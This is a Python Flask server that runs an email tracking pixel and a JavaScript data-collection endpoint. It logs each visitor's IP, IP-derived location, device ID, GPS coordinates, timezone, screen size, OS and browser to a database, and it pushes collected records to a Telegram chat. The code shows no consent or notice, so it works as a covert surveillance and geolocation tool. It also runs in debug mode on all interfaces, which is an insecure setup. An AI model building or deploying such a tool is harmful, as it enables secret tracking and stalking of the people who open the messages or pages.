from flask import Flask, request, jsonify, send_file
import sqlite3
import requests
import datetime
import threading
import io
from user_agents import parse as parse_ua
import os

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID')
DB_DIR = os.path.join(os.path.dirname(__file__), 'collected_data')
os.makedirs(DB_DIR, exist_ok=True)
DB_PATH = os.path.join(DB_DIR, 'collected_data.db')

app = Flask(__name__)

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS collected (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created_at TEXT,
                ip TEXT,
                ip_info TEXT,
                event TEXT,
                user_agent TEXT,
                device_id TEXT,
                mail_client TEXT,
                lat REAL,
                lng REAL,
                timezone TEXT,
                language TEXT,
                screen_size TEXT,
                os TEXT,
                browser TEXT
            )
        ''')

def notify_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def get_ip_info(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if r.status_code == 200:
            return r.text
    except Exception as e:
        print(f"IP info fetch failed: {e}")
    return None

def insert_data(event, req_json, ip, user_agent):
    ua = parse_ua(user_agent or '')
    os_name = f"{ua.os.family} {ua.os.version_string}" if ua.os.family else ""
    browser = f"{ua.browser.family} {ua.browser.version_string}" if ua.browser.family else ""
    ip_info = get_ip_info(ip)
    now = datetime.datetime.utcnow().isoformat()
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            '''INSERT INTO collected (
                created_at, ip, ip_info, event, user_agent, device_id, mail_client,
                lat, lng, timezone, language, screen_size, os, browser
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (
                now, ip, ip_info, event, user_agent,
                req_json.get('device_id'), req_json.get('mail_client'),
                req_json.get('lat'), req_json.get('lng'), req_json.get('timezone'),
                req_json.get('language'), req_json.get('screen_size'),
                os_name, browser
            )
        )

@app.route('/beacon.png')
def beacon():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    insert_data('beacon', {}, ip, ua)
    b = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xdacd\xf8\x0f\x00\x01\x01\x01\x00\x18\xdd\xdcS\x00\x00\x00\x00IEND\xaeB`\x82'
    return send_file(io.BytesIO(b), mimetype='image/png')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json or {}
    ip = request.remote_addr
    ua = data.get('user_agent', request.headers.get('User-Agent', ''))
    insert_data('js', data, ip, ua)
    def notify():
        msg = (
            "[JS Data]\n"
            f"IP: {ip}\n"
            f"OS: {data.get('os', '')}\n"
            f"Browser: {data.get('browser', '')}\n"
            f"LatLng: {data.get('lat', '')},{data.get('lng', '')}\n"
            f"UA: {ua}"
        )
        notify_telegram(msg)
    threading.Thread(target=notify).start()
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=8000, debug=True)